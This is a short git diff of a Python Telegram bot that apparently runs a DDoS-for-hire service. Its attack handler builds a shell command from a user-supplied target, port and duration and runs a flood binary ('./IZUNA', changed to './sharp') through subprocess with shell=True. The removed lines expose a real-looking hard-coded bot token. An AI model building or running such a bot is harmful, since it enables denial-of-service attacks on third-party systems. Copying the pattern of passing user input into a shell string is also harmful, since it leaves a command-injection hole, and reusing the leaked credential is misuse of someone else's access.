@@ -4,10 +4,10 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7611840543:AAGn7zq5hQ079oZUcZ3YDIKijUG4y4T1DHE')
+bot = telebot.TeleBot('')
 
 # Admin user IDs
-admin_id = {"6827411731"}
+admin_id = {"7541279033"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -300,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./IZUNA {target} {port} {time} 1 900"
+                    full_command = f"./sharp {target} {port} {time} 877"
                     subprocess.run(full_command, shell=True)
 
                     response = "attack completed successfully feedback doo."
